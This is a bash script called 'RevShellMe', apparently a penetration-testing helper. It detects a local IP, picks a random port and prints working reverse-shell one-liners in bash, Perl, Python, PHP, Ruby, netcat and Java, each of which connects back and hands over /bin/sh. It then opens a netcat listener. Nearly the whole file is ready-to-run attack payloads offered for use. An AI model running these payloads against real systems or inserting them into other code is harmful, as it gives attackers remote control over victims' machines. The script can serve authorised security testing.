#! /bin/bash

ip_addr=`ip addr | grep "inet 192" | cut -d" " -f6 | cut -d"/" -f1`
port=`head -n10 /dev/urandom | tr -dc "1-9" | tail -c4`

while getopts i:p: option
do
case "${option}"
in
i) ip_addr=${OPTARG};;
p) port=${OPTARG};;
esac
done

echo "#############################################################"
echo "# RevShellMe - a script for lazy Reverse Shells by @ticarpi #"
echo "#      [Payloads lovingly stolen from @pentestmonkey]       #"
echo "#############################################################"
echo
echo "[*] IP: "$ip_addr
echo "[*] Port: "$port
echo
echo "============================================================="
echo
echo [+] Bash Payload:
echo "bash -i >& /dev/tcp/${ip_addr}/${port} 0>&1"

echo
echo [+] Perl Payload:
echo "perl -e 'use Socket;\$i=\"${ip_addr}\";\$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"

echo
echo [+] Python Payload:
echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${ip_addr}\",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"

echo
echo [+] PHP Payload:
echo "php -r '\$sock=fsockopen(\"${ip_addr}\",${port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"

echo
echo [+] Ruby Payload:
echo "ruby -rsocket -e'f=TCPSocket.open(\"${ip_addr}\",${port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"

echo
echo [+] Netcat Payload:
echo "nc -e /bin/sh ${ip_addr} ${port}"

echo
echo [+] Netcat Payload:
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip_addr} ${port} >/tmp/f"

echo
echo [+] Java Payload:
echo 'r = Runtime.getRuntime();p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/'$ip_addr'/'$port';cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]);p.waitFor()'
echo
echo "============================================================="
echo
echo [+] Opening Netcat listener on port $port
nc -lvnp $port
